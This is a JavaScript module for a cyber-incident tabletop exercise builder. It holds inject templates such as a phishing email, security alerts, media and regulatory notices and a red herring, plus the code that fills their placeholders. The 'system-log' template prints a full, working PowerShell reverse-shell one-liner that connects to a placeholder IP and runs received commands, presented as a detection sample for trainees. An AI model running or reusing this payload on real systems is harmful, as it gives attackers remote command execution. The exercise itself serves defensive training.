/**
 * Injects Module for Northwave Resilience Scenario Builder
 * Handles inject templates and management
 */

const injectsModule = (function() {
    // Inject templates for different types
    const INJECT_TEMPLATES = {
        phishing: {
            title: "Suspicious Email",
            sender: "unknown@suspicious-domain.com",
            recipient: "employee@company.com",
            content: `From: {sender}
To: {recipient}
Subject: Urgent: Account Verification Required

Dear {recipient},

We have detected unusual activity on your account. To ensure your account security, please verify your credentials immediately by clicking the link below:

[SECURE VERIFICATION LINK]

This link will expire in 24 hours. Failure to verify may result in account suspension.

Best regards,
IT Security Team`,
            expectedActions: [
                "Identify this as a phishing attempt",
                "Report to security team",
                "Do not click on links or download attachments"
            ]
        },
        
        "security-alert": {
            title: "Security Alert: Unusual Login Activity",
            sender: "security-monitoring@company.com",
            recipient: "security-team@company.com",
            content: `ALERT ID: SEC-{random:100000-999999}
SEVERITY: High
DETECTION TIME: {timestamp}

Alert Details:
Multiple failed login attempts detected for user account: {random-user}@{company-domain}

Source IP: {random-ip}
Location: {random-location}
Attempts: {random:5-20}
Time Period: 30 minutes

This activity exceeds normal threshold and is indicative of potential brute force attack.

Recommended Actions:
1. Verify if this is expected activity
2. Lock the affected account if suspicious
3. Check for other affected accounts
4. Review access logs for additional anomalies

REFERENCE: MITRE ATT&CK T1110 - Brute Force`,
            expectedActions: [
                "Acknowledge the alert",
                "Investigate the login attempts",
                "Lock the affected account if necessary",
                "Check other security logs for related activity"
            ]
        },
        
        "user-report": {
            title: "User Report: System Performance Issues",
            sender: "employee@company.com",
            recipient: "helpdesk@company.com",
            content: `From: {sender}
To: {recipient}
Subject: Extremely Slow Computer and Strange Behavior

Hi IT Support,

I'm experiencing some serious issues with my computer since this morning:

1. It's extremely slow to respond, taking several minutes to open applications
2. I'm seeing strange pop-ups appearing occasionally
3. My files seem to be renamed or have strange extensions now
4. I received an email from IT yesterday asking me to install an update, which I did

Can someone please help me with this urgently? I have an important presentation in a few hours.

Thanks,
{random-name}
{random-department}
Ext. {random:1000-9999}`,
            expectedActions: [
                "Prioritize this ticket as a potential security incident",
                "Ask for additional details about the email and the update",
                "Escalate to security team",
                "Isolate the affected system"
            ]
        },
        
        "malware-detection": {
            title: "Antivirus Alert: Malware Detected",
            sender: "security-monitoring@company.com",
            recipient: "security-team@company.com",
            content: `ALERT ID: AV-{random:100000-999999}
DETECTION TIME: {timestamp}
SYSTEM: {random-hostname}

Malware Detection Details:
File: {random-path}\\{random-filename}.exe
Hash: {random-hash}
Classification: Trojan.Ransomware
Severity: Critical

Action Taken: File quarantined
User: {random-user}

Additional Information:
- Similar files detected on 3 other systems
- File appears to have been downloaded from email attachment
- File attempts to establish connection to {random-ip} on port 443

REFERENCE: MITRE ATT&CK T1566 - Phishing`,
            expectedActions: [
                "Verify if the malware was successfully quarantined",
                "Identify the origin of the malware",
                "Check for other infected systems",
                "Isolate affected systems if necessary"
            ]
        },
        
        "system-log": {
            title: "System Log: Suspicious PowerShell Commands",
            sender: "monitoring-system@company.com",
            recipient: "security-team@company.com",
            content: `LOG ID: PS-{random:100000-999999}
SYSTEM: {random-hostname}
USER CONTEXT: {random-user}
TIMESTAMP: {timestamp}

Suspicious PowerShell command executed:

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {random-base64}

Command decoded:
$client = New-Object System.Net.Sockets.TCPClient('{random-ip}',{random:1000-9999});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

This appears to be a reverse shell command attempting to establish an outbound connection.

REFERENCE: MITRE ATT&CK T1059.001 - Command and Scripting Interpreter: PowerShell`,
            expectedActions: [
                "Analyze the PowerShell command",
                "Investigate the system for additional evidence of compromise",
                "Check for network connections to the suspicious IP",
                "Isolate the affected system"
            ]
        },
        
        "business-impact": {
            title: "Business Impact Assessment",
            sender: "operations@company.com",
            recipient: "crisis-management@company.com",
            content: `BUSINESS IMPACT ASSESSMENT
INCIDENT: {incident-type}
TIME OF ASSESSMENT: {timestamp}

Affected Systems/Services:
- Customer Portal: OFFLINE (Est. Impact: 2,500 users/hour)
- Payment Processing: DEGRADED (Est. Impact: $150,000/hour in delayed transactions)
- Internal Email: OPERATIONAL
- ERP System: OFFLINE (Est. Impact: Order processing halted)
- Data Warehouse: OPERATIONAL

Operational Impact:
- Customer Service: HIGH (Call volume increased by 300%)
- Sales: MEDIUM (New orders cannot be processed)
- Finance: HIGH (End-of-month processing affected)
- Manufacturing: LOW (Current operations continuing with local systems)

Estimated Financial Impact:
- Revenue Loss: $25,000 per hour
- Recovery Costs: Est. $50,000-100,000
- Reputational Damage: MODERATE

Stakeholder Notifications Required:
- Customers: YES (Service outage notification)
- Regulators: YES (If outage exceeds 4 hours)
- Partners: YES (For integrated services)
- Investors: STANDBY (Prepare statement if media coverage occurs)

Workarounds Available:
- Manual order processing system activated
- Temporary payment processing through backup provider
- Customer service increased staffing`,
            expectedActions: [
                "Review and prioritize affected business functions",
                "Approve temporary workarounds",
                "Authorize emergency spending for recovery",
                "Approve communications plan",
                "Set recovery time objectives"
            ]
        },
        
        "media-inquiry": {
            title: "Media Inquiry: Service Outage Reports",
            sender: "reporter@newsmedia.com",
            recipient: "press@company.com",
            content: `From: {sender}
To: {recipient}
Subject: Media Inquiry - Customer Complaints About Service Outage

To whom it may concern,

I'm a reporter with [News Organization] working on a story about what appears to be a significant service outage affecting your customers.

We've received multiple reports from customers unable to access their accounts, and there are numerous complaints appearing on social media platforms. Several sources have suggested this may be related to a cybersecurity incident.

I'm reaching out for comment on:
1. Is there currently an outage affecting your services?
2. What is the nature and cause of the outage?
3. How many customers are affected?
4. When do you expect services to be restored?
5. Is this related to a security breach or cyberattack?
6. What measures are you taking to protect customer data?

Our publication deadline is 5:00 PM today. Any information you can provide would be appreciated.

Best regards,
{random-name}
Technology Reporter
{random-media-outlet}
Phone: {random-phone}`,
            expectedActions: [
                "Notify crisis management team immediately",
                "Prepare a statement with approved facts only",
                "Consult with legal before responding",
                "Consider timing of response in relation to customer notifications",
                "Monitor social media for additional coverage"
            ]
        },
        
        "executive-update": {
            title: "Executive Update: Incident Status Report",
            sender: "ciso@company.com",
            recipient: "executive-team@company.com",
            content: `CONFIDENTIAL: EXECUTIVE BRIEFING
SUBJECT: Incident Status Report #1
TIME: {timestamp}

Dear Executive Leadership Team,

This is an initial briefing on the ongoing cyber incident affecting our organization.

INCIDENT SUMMARY:
We have confirmed unauthorized access to several of our IT systems. The incident was detected at [Detection Time] and appears to have begun approximately [Timeframe] earlier.

CURRENT STATUS:
- Incident Response Team activated and working with [External Security Firm]
- Affected systems isolated from network
- Investigation ongoing to determine full scope
- No evidence of data exfiltration at this time, but investigation continues
- Containment efforts underway

BUSINESS IMPACT:
- Customer-facing systems: 40% operational
- Internal systems: 60% operational
- Estimated financial impact: Under assessment
- Regulatory reporting: Required within next 48 hours

IMMEDIATE ACTIONS TAKEN:
- Engaged forensic specialists
- Implemented emergency access controls
- Activated business continuity procedures
- Prepared initial customer and staff communications

DECISIONS NEEDED:
1. Approval for emergency procurement ($150K) for incident response assistance
2. Review and approval of external communication strategy
3. Guidance on customer notification timing

A full briefing is scheduled for [Time] in the Executive Conference Room. Please prioritize attendance.

Regards,
[CISO Name]`,
            expectedActions: [
                "Review incident details and current status",
                "Approve requested resources and budget",
                "Make decisions on key issues requiring executive input",
                "Prepare for regulatory and board communications",
                "Set expectations for next update"
            ]
        },
        
        "customer-impact": {
            title: "Customer Impact Analysis",
            sender: "customer-service@company.com",
            recipient: "crisis-management@company.com",
            content: `CUSTOMER IMPACT ANALYSIS
INCIDENT: {incident-type}
TIME OF ANALYSIS: {timestamp}

Current Customer-Facing Issues:
- Website Login: UNAVAILABLE (Since {timeframe})
- Account Access: UNAVAILABLE (Since {timeframe})
- Payment Processing: DELAYED (30+ minute processing time)
- Customer Support Portal: OPERATIONAL
- Mobile App: PARTIAL FUNCTIONALITY (View-only mode)

Customer Feedback Channels:
- Call Center: 450% increase in call volume
- Social Media: 200+ negative mentions in past hour
- App Store: Recent ratings dropped to 1.5 stars
- Email: 300+ complaint emails received

Top Customer Concerns:
1. Account security and potential data compromise
2. Missed payments and potential late fees
3. Inability to access critical services
4. Lack of clear communication about the issue
5. Timeline for resolution

Customer Segments Most Affected:
- Enterprise clients: 24 critical clients impacted
- High-value individual customers: Est. 1,200 impacted
- Regular users: Est. 35,000 impacted

Recommended Customer Communications:
- Immediate acknowledgment of issue via all channels
- Regular status updates (suggest hourly)
- Clear explanation of protective measures taken
- Specific remediation options for affected customers

Suggested Remediation Actions:
- Waive fees for affected period
- Extend payment deadlines by 72 hours
- Offer customer goodwill credit ($25 suggested)
- Dedicated support line for enterprise clients`,
            expectedActions: [
                "Approve customer communication plan",
                "Allocate additional customer service resources",
                "Decide on remediation actions",
                "Prioritize recovery of most critical customer services",
                "Monitor social media and public response"
            ]
        },
        
        "regulatory-notification": {
            title: "Draft Regulatory Notification",
            sender: "legal@company.com",
            recipient: "crisis-management@company.com",
            content: `CONFIDENTIAL: DRAFT REGULATORY NOTIFICATION
TIME: {timestamp}

The following draft notification has been prepared for submission to relevant regulatory authorities:

---DRAFT NOTIFICATION START---

To: [Regulatory Authority]
From: [Company Name]
Date: [Date]
Subject: Notification of Security Incident

In accordance with [Relevant Regulation], we are hereby notifying you of a security incident affecting our organization.

Incident Details:
- Date and time of discovery: [Discovery Time]
- Nature of the incident: Unauthorized access to internal systems
- Systems/data potentially affected: [Specific Systems]
- Current status: Under investigation, containment measures implemented
- Potential impact: Under assessment, no confirmed data breach at this time

Actions Taken:
- Activated Incident Response Plan at [Time]
- Engaged external forensic specialists
- Implemented containment measures
- Conducting comprehensive investigation

Next Steps:
- Continue investigation to determine scope and impact
- Implement additional security measures
- Provide update to your office within 72 hours
- Prepare customer notifications pending investigation findings

Please contact our Data Protection Officer at [Contact Information] for any additional information or clarification.

---DRAFT NOTIFICATION END---

This notification requires review and approval before submission. According to our assessment, this notification must be filed within [Timeframe] to meet regulatory requirements.

Legal Department`,
            expectedActions: [
                "Review draft notification for accuracy and completeness",
                "Consult with legal counsel before submission",
                "Ensure alignment with investigation findings",
                "Approve final notification",
                "Track regulatory submission deadlines"
            ]
        },
        
        "workaround": {
            title: "Business Process Workarounds Implementation",
            sender: "business-continuity@company.com",
            recipient: "all-managers@company.com",
            content: `BUSINESS CONTINUITY: EMERGENCY WORKAROUNDS
IMPLEMENTATION DATE: [Current Date]
EFFECTIVE IMMEDIATELY

Due to the ongoing system outage, the following business process workarounds are being implemented immediately:

1. CUSTOMER ORDER PROCESSING
   Normal Process: ERP system automated workflow
   Workaround: Manual order forms (attached) to be emailed to orders@company.com
   Implementation Owner: Sales Operations
   
2. PAYMENT PROCESSING
   Normal Process: Integrated payment gateway
   Workaround: Alternate payment processor accessible at https://backup-payments.company.com
   Note: Requires manual reconciliation daily
   Implementation Owner: Finance
   
3. CUSTOMER VERIFICATION
   Normal Process: Automated ID verification system
   Workaround: Manual verification protocol using attached procedure
   Note: May increase processing time by 15-20 minutes per customer
   Implementation Owner: Customer Service
   
4. EMPLOYEE TIMEKEEPING
   Normal Process: Digital time tracking system
   Workaround: Excel timesheet template (attached)
   Implementation Owner: Department Managers
   
5. INTERNAL COMMUNICATIONS
   Normal Process: Company email and messaging
   Workaround: WhatsApp Emergency Group and SMS cascade
   Implementation Owner: IT and Communications
   
All workarounds will remain in effect until systems are restored. Department managers are responsible for ensuring their teams are trained on these procedures immediately.

Daily status meetings will be held at 9:00 AM and 4:00 PM in Conference Room A to address any issues with the workarounds.

Business Continuity Team`,
            expectedActions: [
                "Distribute workaround procedures to all relevant staff",
                "Ensure resources are available for manual processes",
                "Monitor effectiveness of workarounds",
                "Provide feedback on implementation challenges",
                "Prepare for eventual return to normal operations"
            ]
        },
        
        "workforce": {
            title: "Workforce Management Plan",
            sender: "hr@company.com",
            recipient: "all-managers@company.com",
            content: `WORKFORCE MANAGEMENT PLAN
EFFECTIVE: Immediately
DURATION: Until incident resolution

Due to the ongoing incident, the following workforce arrangements are being implemented:

STAFFING CHANGES:
1. IT & Security Teams
   - All IT and Security staff are recalled from leave
   - Authorized for overtime (up to 20 hours/week)
   - Shift pattern changed to 12-hour rotations

2. Customer Service
   - 50% increase in staffing for helpdesk and call center
   - Temporary staff being onboarded from agency
   - Extended hours (7:00 AM - 10:00 PM)

3. Operations & Sales
   - Non-essential functions postponed
   - Staff reassigned to support critical functions
   - Cross-training sessions scheduled for tomorrow

WORK LOCATION CHANGES:
- HQ Building: Limited to incident response personnel only
- Remote Work: Enabled for all non-essential staff
- Disaster Recovery Site: Activated for critical business functions
- Branch Offices: Operating with minimal staff

COMMUNICATION PROTOCOLS:
- Daily staff briefings at 8:30 AM via conference call
- Managers to check in with teams twice daily
- Emergency contact list updated (see attachment)
- Out-of-band communication methods established

SPECIAL CONSIDERATIONS:
- Accommodation arranged for essential staff near offices
- Transportation services available for night shifts
- Meal services arranged for extended shifts
- Counseling services available for staff

Please ensure all your team members are informed of these arrangements.
Questions should be directed to the HR Emergency Response Team at ext. 5500.

Human Resources Department`,
            expectedActions: [
                "Implement staffing changes as directed",
                "Ensure critical functions are adequately staffed",
                "Maintain communication with remote workers",
                "Monitor staff wellbeing during extended operations",
                "Prepare for potential long-term adjustments"
            ]
        },
        
        "communication": {
            title: "Stakeholder Communication Plan",
            sender: "communications@company.com",
            recipient: "crisis-management@company.com",
            content: `STAKEHOLDER COMMUNICATION PLAN
INCIDENT: {incident-type}
VERSION: 1.0
DATE: [Current Date]

This plan outlines the coordinated communication approach for all stakeholders during the current incident.

KEY MESSAGES:
1. We have identified a cybersecurity incident affecting certain systems
2. We have implemented our incident response plan
3. We are working diligently to restore services
4. Protecting customer data is our highest priority
5. We are cooperating with appropriate authorities

STAKEHOLDER-SPECIFIC COMMUNICATIONS:

1. CUSTOMERS
   Channel: Email, Website Banner, Social Media
   Timing: Initial notification ASAP, then updates every 4 hours
   Owner: Customer Experience Team
   Approval: Legal + CMO
   Status: DRAFT READY FOR APPROVAL

2. EMPLOYEES
   Channel: Email, Intranet, Manager Cascade
   Timing: Initial notification ASAP, then daily updates
   Owner: HR Communications
   Approval: CHRO
   Status: SENT AT [Time]

3. REGULATORS
   Channel: Formal Notification Letters
   Timing: As required by regulations (typically 24-72 hours)
   Owner: Legal Department
   Approval: General Counsel + CEO
   Status: IN PREPARATION

4. MEDIA
   Channel: Press Release, Media Statements
   Timing: Initial statement within 3 hours, then as needed
   Owner: PR Team
   Approval: CMO + CEO
   Status: DRAFT READY FOR APPROVAL

5. PARTNERS/SUPPLIERS
   Channel: Direct contact from Account Managers
   Timing: Within 12 hours
   Owner: Supply Chain Management
   Approval: COO
   Status: PENDING

6. INVESTORS
   Channel: Investor Relations Email, SEC Filing if required
   Timing: Within 24 hours
   Owner: Investor Relations
   Approval: CFO + CEO
   Status: MONITORING FOR MATERIALITY

All communications must be approved through the specified channels before release.
The Communications Team will maintain a log of all external communications.

Please review and approve the attached communication drafts.

Communications Department`,
            expectedActions: [
                "Review and approve communication materials",
                "Ensure consistent messaging across all channels",
                "Coordinate timing of different stakeholder communications",
                "Monitor public response to communications",
                "Prepare for follow-up communications as situation evolves"
            ]
        },
        
        "recovery-action": {
            title: "System Recovery Plan",
            sender: "it-recovery@company.com",
            recipient: "incident-response@company.com",
            content: `SYSTEM RECOVERY PLAN
VERSION: 1.0
DATE: [Current Date]

This document outlines the plan for recovering affected systems following the security incident.

RECOVERY PRIORITIES:
1. Authentication Systems (Est. completion: T+8 hours)
2. Customer-Facing Web Applications (Est. completion: T+12 hours)
3. Payment Processing Systems (Est. completion: T+16 hours)
4. Internal Business Systems (Est. completion: T+24 hours)
5. Data Warehousing & Analytics (Est. completion: T+36 hours)

RECOVERY APPROACH:
- Clean build from verified images
- Data restoration from offline backups dated [Date] (pre-incident)
- Enhanced security controls implementation during rebuild
- Verification testing before returning to production

RESOURCE REQUIREMENTS:
- Recovery Team: 12 IT staff in 3 shifts
- Infrastructure: Dedicated recovery environment provisioned
- Security Support: Real-time monitoring during recovery
- External Support: [Vendor] engineers on standby

VERIFICATION PROCESS:
- Security scanning of all recovered systems
- Integrity validation of all restored data
- Functionality testing of all critical processes
- Performance testing under load
- Final security sign-off required before production

POTENTIAL CHALLENGES:
- Backup completeness for [System X] is uncertain
- Hardware availability for [System Y] may be limited
- Integration testing will require business user availability
- VPN capacity may limit remote access during testing

DATA RECONCILIATION:
- Transactions from [Time] to [Time] will require manual reconciliation
- Customer data changes in the last 24 hours may need re-entry
- Financial reports for the affected period will require adjustment

This plan has been reviewed by the Security Team and is pending final approval.

IT Recovery Team`,
            expectedActions: [
                "Review and approve recovery priorities",
                "Allocate required resources for recovery",
                "Monitor recovery progress against timeline",
                "Ensure security verification is completed",
                "Prepare for business process resumption"
            ]
        },
        
        "red-herring": {
            title: "Network Maintenance Notification",
            sender: "it-maintenance@company.com",
            recipient: "all-staff@company.com",
            content: `From: IT Maintenance <it-maintenance@company.com>
To: All Staff <all-staff@company.com>
Subject: Planned Network Maintenance - Possible Service Disruptions

NOTICE OF PLANNED NETWORK MAINTENANCE

Please be advised that our IT department will be conducting planned network maintenance that may result in intermittent service disruptions.

Maintenance Window:
Date: [Current Date]
Time: 20:00 - 02:00

Systems Affected:
- Internet connectivity (brief outages of 5-10 minutes)
- Email services (possible delays in delivery)
- VPN access (may require reconnection)
- File shares (read-only during maintenance)

This maintenance is part of our regular infrastructure upgrade program to enhance network security and performance. The work involves firmware updates to core network equipment and security appliances.

No action is required on your part. However, we recommend saving your work frequently during this period and avoiding critical time-sensitive work if possible.

If you experience any issues after the maintenance window, please contact the IT Helpdesk.

We apologize for any inconvenience this may cause and appreciate your understanding.

IT Operations Team`,
            expectedActions: [
                "Verify if this is actually planned maintenance",
                "Check if this could be related to the security incident",
                "Confirm the legitimacy of the sender",
                "Consider whether this could be malicious activity"
            ],
            isRedHerring: true
        }
    };
    
    /**
     * Initialize the injects module
     */
    function init() {
        console.log('Injects Module initialized');
    }
    
    /**
     * Get a template for a specific inject type
     * @param {string} injectType - The type of inject
     * @returns {Object} - The template
     */
    function getTemplate(injectType) {
        return INJECT_TEMPLATES[injectType] || null;
    }
    
    /**
     * Create an inject from a template
     * @param {string} injectType - The type of inject
     * @param {string} phaseId - The phase ID
     * @returns {Object} - The created inject
     */
    function createFromTemplate(injectType, phaseId) {
        // Get the template
        const template = getTemplate(injectType);
        
        if (!template) {
            console.error(`No template found for inject type: ${injectType}`);
            return null;
        }
        
        // Generate a timestamp
        const timestamp = generateTimestamp(phaseId);
        
        // Generate an ID
        const id = generateInjectId(phaseId);
        
        // Process template content
        const processedContent = processTemplateContent(template.content, {
            timestamp,
            'company-domain': getCompanyDomain(),
            'incident-type': APP_STATE.scenario.params.attackType,
            'timeframe': getRandomTimeframe()
        });
        
        // Create the inject
        return {
            id,
            title: template.title,
            type: injectType,
            category: getCategoryForType(injectType),
            phase: phaseId,
            sender: template.sender,
            recipient: template.recipient,
            timestamp,
            content: processedContent,
            attachments: [],
            businessImpact: template.businessImpact || null,
            technicalDetails: template.technicalDetails || null,
            expectedActions: template.expectedActions || [],
            isRedHerring: template.isRedHerring || false,
            mitreTechniques: []
        };
    }
    
    /**
     * Process template content by replacing placeholders
     * @param {string} content - The template content
     * @param {Object} data - The data to use for replacements
     * @returns {string} - The processed content
     */
    function processTemplateContent(content, data) {
        let processedContent = content;
        
        // Replace simple placeholders
        Object.keys(data).forEach(key => {
            const placeholder = new RegExp(`{${key}}`, 'g');
            processedContent = processedContent.replace(placeholder, data[key]);
        });
        
        // Replace random placeholders
        processedContent = processedContent.replace(/{random:(\d+)-(\d+)}/g, (match, min, max) => {
            return getRandomNumber(parseInt(min), parseInt(max));
        });
        
        // Replace special placeholders
        processedContent = processedContent.replace(/{random-ip}/g, getRandomIP());
        processedContent = processedContent.replace(/{random-user}/g, getRandomUsername());
        processedContent = processedContent.replace(/{random-hostname}/g, getRandomHostname());
        processedContent = processedContent.replace(/{random-path}/g, getRandomFilePath());
        processedContent = processedContent.replace(/{random-filename}/g, getRandomFilename());
        processedContent = processedContent.replace(/{random-hash}/g, getRandomHash());
        processedContent = processedContent.replace(/{random-name}/g, getRandomName());
        processedContent = processedContent.replace(/{random-department}/g, getRandomDepartment());
        processedContent = processedContent.replace(/{random-base64}/g, getRandomBase64());
        processedContent = processedContent.replace(/{random-location}/g, getRandomLocation());
        processedContent = processedContent.replace(/{random-phone}/g, getRandomPhone());
        processedContent = processedContent.replace(/{random-media-outlet}/g, getRandomMediaOutlet());
        
        return processedContent;
    }
    
    /**
     * Generate a timestamp for an inject
     * @param {string} phaseId - The phase ID
     * @returns {string} - The formatted timestamp
     */
    function generateTimestamp(phaseId) {
        // Find the day number for this phase
        const phaseOrder = ['identification', 'containment', 'eradication', 'recovery', 'hardening'];
        const dayNumber = phaseOrder.indexOf(phaseId) + 1;
        
        // Generate a random time between 9:00 and 17:00
        const hours = getRandomNumber(9, 17);
        const minutes = getRandomNumber(0, 59);
        
        return `Day ${dayNumber} - ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}`;
    }
    
    /**
     * Generate a unique inject ID
     * @param {string} phaseId - The phase ID
     * @returns {string} - The unique ID
     */
    function generateInjectId(phaseId) {
        // Get prefix based on phase
        const prefixMap = {
            'identification': 'IDN',
            'containment': 'CNT',
            'eradication': 'ERA',
            'recovery': 'REC',
            'hardening': 'HDN'
        };
        
        const prefix = prefixMap[phaseId] || 'INJ';
        
        // Get existing injects for this phase
        const phaseInjects = APP_STATE.scenario.injects ? 
            APP_STATE.scenario.injects.filter(inject => inject.phase === phaseId) : [];
        
        // Create sequential number
        const number = phaseInjects.length + 1;
        
        return `${prefix}${String(number).padStart(3, '0')}`;
    }
    
    /**
     * Get the category for an inject type
     * @param {string} injectType - The inject type
     * @returns {string} - The category (technical or business)
     */
    function getCategoryForType(injectType) {
        if (['phishing', 'security-alert', 'malware-detection', 'system-log', 'user-report'].includes(injectType)) {
            return 'technical';
        } else {
            return 'business';
        }
    }
    
    /**
     * Get a random company domain based on the scenario parameters
     * @returns {string} - A domain name
     */
    function getCompanyDomain() {
        const sector = APP_STATE.scenario.params.organizationSector || 'company';
        return `${sector.toLowerCase().replace(/\s+/g, '')}.com`;
    }
    
    /**
     * Get a random timeframe string
     * @returns {string} - A timeframe description
     */
    function getRandomTimeframe() {
        const timeframes = [
            '2 hours ago',
            'approximately 3 hours ago',
            'earlier this morning',
            'overnight',
            'yesterday evening',
            'earlier today'
        ];
        
        return timeframes[Math.floor(Math.random() * timeframes.length)];
    }
    
    /**
     * Get a random number between min and max (inclusive)
     * @param {number} min - Minimum value
     * @param {number} max - Maximum value
     * @returns {number} - Random number
     */
    function getRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    
    /**
     * Get a random IP address
     * @returns {string} - Random IP
     */
    function getRandomIP() {
        return `${getRandomNumber(1, 255)}.${getRandomNumber(1, 255)}.${getRandomNumber(1, 255)}.${getRandomNumber(1, 255)}`;
    }
    
    /**
     * Get a random username
     * @returns {string} - Random username
     */
    function getRandomUsername() {
        const firstNames = ['john', 'jane', 'robert', 'mary', 'david', 'linda', 'michael', 'sarah', 'william', 'susan'];
        const lastNames = ['smith', 'jones', 'brown', 'johnson', 'williams', 'davis', 'miller', 'wilson', 'moore', 'taylor'];
        
        const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
        const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
        
        const formats = [
            `${firstName}.${lastName}`,
            `${firstName}${lastName}`,
            `${firstName}${lastName.charAt(0)}`,
            `${firstName.charAt(0)}${lastName}`,
            `${lastName}.${firstName}`
        ];
        
        return formats[Math.floor(Math.random() * formats.length)];
    }
    
    /**
     * Get a random hostname
     * @returns {string} - Random hostname
     */
    function getRandomHostname() {
        const prefixes = ['WS', 'SRV', 'DC', 'DB', 'APP', 'WEB', 'FW', 'VPN', 'MAIL', 'FILE'];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        
        return `${prefix}-${getRandomNumber(10, 99)}`;
    }
    
    /**
     * Get a random file path
     * @returns {string} - Random file path
     */
    function getRandomFilePath() {
        const roots = ['C:', 'D:', 'E:'];
        const folders = ['\\Users', '\\Program Files', '\\Windows', '\\temp', '\\Downloads', '\\Documents'];
        const subfolders = ['\\Admin', '\\Shared', '\\Projects', '\\temp', '\\Backup', '\\Data'];
        
        const root = roots[Math.floor(Math.random() * roots.length)];
        const folder = folders[Math.floor(Math.random() * folders.length)];
        const subfolder = Math.random() > 0.5 ? subfolders[Math.floor(Math.random() * subfolders.length)] : '';
        
        return `${root}${folder}${subfolder}`;
    }
    
    /**
     * Get a random filename
     * @returns {string} - Random filename
     */
    function getRandomFilename() {
        const names = ['update', 'document', 'invoice', 'report', 'backup', 'data', 'file', 'install', 'scan', 'setup'];
        const extensions = ['exe', 'dll', 'bat', 'ps1', 'vbs', 'js', 'doc', 'pdf', 'zip', 'rar'];
        
        const name = names[Math.floor(Math.random() * names.length)];
        const extension = extensions[Math.floor(Math.random() * extensions.length)];
        
        return `${name}${getRandomNumber(100, 999)}.${extension}`;
    }
    
    /**
     * Get a random hash (MD5-like)
     * @returns {string} - Random hash
     */
    function getRandomHash() {
        const chars = '0123456789abcdef';
        let hash = '';
        
        for (let i = 0; i < 32; i++) {
            hash += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        
        return hash;
    }
    
    /**
     * Get a random name
     * @returns {string} - Random name
     */
    function getRandomName() {
        const firstNames = ['John', 'Jane', 'Robert', 'Mary', 'David', 'Linda', 'Michael', 'Sarah', 'William', 'Susan'];
        const lastNames = ['Smith', 'Jones', 'Brown', 'Johnson', 'Williams', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor'];
        
        const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
        const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
        
        return `${firstName} ${lastName}`;
    }
    
    /**
     * Get a random department
     * @returns {string} - Random department
     */
    function getRandomDepartment() {
        const departments = [
            'Finance',
            'HR',
            'Marketing',
            'Sales',
            'Operations',
            'IT',
            'Legal',
            'Customer Service',
            'Research & Development',
            'Executive'
        ];
        
        return departments[Math.floor(Math.random() * departments.length)];
    }
    
    /**
     * Get random Base64-encoded data
     * @returns {string} - Random Base64
     */
    function getRandomBase64() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
        let base64 = '';
        
        // Generate a shorter string for display purposes
        for (let i = 0; i < 40; i++) {
            base64 += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        
        return base64;
    }
    
    /**
     * Get a random location
     * @returns {string} - Random location
     */
    function getRandomLocation() {
        const locations = [
            'United States', 
            'Russia', 
            'China', 
            'United Kingdom', 
            'Germany', 
            'Brazil', 
            'India', 
            'Netherlands', 
            'Ukraine', 
            'Romania'
        ];
        
        return locations[Math.floor(Math.random() * locations.length)];
    }
    
    /**
     * Get a random phone number
     * @returns {string} - Random phone
     */
    function getRandomPhone() {
        return `+1 (${getRandomNumber(200, 999)}) ${getRandomNumber(100, 999)}-${getRandomNumber(1000, 9999)}`;
    }
    
    /**
     * Get a random media outlet
     * @returns {string} - Random media outlet
     */
    function getRandomMediaOutlet() {
        const outlets = [
            'Tech News Daily',
            'Business Insider',
            'The Daily Reporter',
            'Cyber Security Today',
            'National Technology Review',
            'Digital Times',
            'Business & Tech Journal',
            'The Morning Chronicle',
            'Technology Gazette',
            'Global News Network'
        ];
        
        return outlets[Math.floor(Math.random() * outlets.length)];
    }
    
    // Public API
    return {
        init,
        getTemplate,
        createFromTemplate
    };
})();